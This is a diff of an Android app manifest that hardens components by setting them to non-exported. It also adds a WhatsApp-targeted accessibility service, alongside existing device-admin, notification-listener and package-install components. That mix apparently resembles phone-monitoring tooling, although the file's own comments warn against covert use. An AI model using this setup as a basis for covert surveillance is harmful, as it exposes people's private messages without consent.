@@ -7,10 +7,9 @@
     <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
     <uses-permission android:name="android.permission.REQUEST_INSTALL_PACKAGES" />
 
-    <!-- Queries element for package visibility -->
+    <!-- Package visibility for queries -->
     <queries>
         <package android:name="com.whatsapp" />
-        <package android:name="com.microsoft.teams" />
         <package android:name="com.android.vending" />
         <package android:name="com.xiaomi.mipicks" />
         <package android:name="com.sec.android.app.samsungapps" />
@@ -24,46 +23,63 @@
         android:supportsRtl="true"
         android:theme="@style/Theme.AppCompat.Light.NoActionBar">
 
-        <!-- Main launcher activity -->
+        <!-- Main launcher activity (exported must be true for launcher) -->
         <activity
             android:name=".MainActivity"
             android:exported="true"
             android:launchMode="singleTop">
             <intent-filter>
-                <action android:name="android.intent.action.MAIN"/>
-                <category android:name="android.intent.category.LAUNCHER"/>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
             </intent-filter>
         </activity>
 
-        <!-- Device Admin Receiver -->
+        <!-- Device Admin Receiver
+             exported=false because only the system should send these broadcasts -->
         <receiver
             android:name=".MyDeviceAdminReceiver"
             android:permission="android.permission.BIND_DEVICE_ADMIN"
-            android:exported="true">
+            android:exported="false">
             <meta-data
                 android:name="android.app.device_admin"
-                android:resource="@xml/device_admin_receiver"/>
+                android:resource="@xml/device_admin_receiver" />
             <intent-filter>
-                <action android:name="android.app.action.DEVICE_ADMIN_ENABLED"/>
-                <action android:name="android.app.action.PROFILE_PROVISIONING_COMPLETE"/>
-                <action android:name="android.app.action.DEVICE_ADMIN_DISABLE_REQUESTED"/>
+                <action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />
+                <action android:name="android.app.action.PROFILE_PROVISIONING_COMPLETE" />
+                <action android:name="android.app.action.DEVICE_ADMIN_DISABLE_REQUESTED" />
             </intent-filter>
         </receiver>
 
-        <!-- Notification Listener Service -->
+        <!-- Notification listener service
+             keep permission on the service; do NOT add a top-level uses-permission for this -->
         <service
             android:name=".MyNotificationListenerService"
-            android:exported="true"
-            android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE">
+            android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE"
+            android:exported="false">
             <intent-filter>
                 <action android:name="android.service.notification.NotificationListenerService" />
             </intent-filter>
         </service>
 
+        <!-- Accessibility service (if you truly need it) -->
+        <!-- NOTE: Accessibility is sensitive. Use only for legitimate accessibility functionality.
+             Do NOT use AccessibilityService for covert monitoring (Play policy/legal risk). -->
+        <service
+            android:name=".WhatsAppAccessibilityService"
+            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
+            android:exported="false">
+            <intent-filter>
+                <action android:name="android.accessibilityservice.AccessibilityService" />
+            </intent-filter>
+            <meta-data
+                android:name="android.accessibilityservice"
+                android:resource="@xml/accessibility_service_config" />
+        </service>
+
         <!-- Package Installer Broadcast Receiver -->
         <receiver
             android:name=".PackageInstallerReceiver"
-            android:exported="true">
+            android:exported="false">
             <intent-filter>
                 <action android:name="android.content.pm.action.SESSION_COMMITTED" />
             </intent-filter>
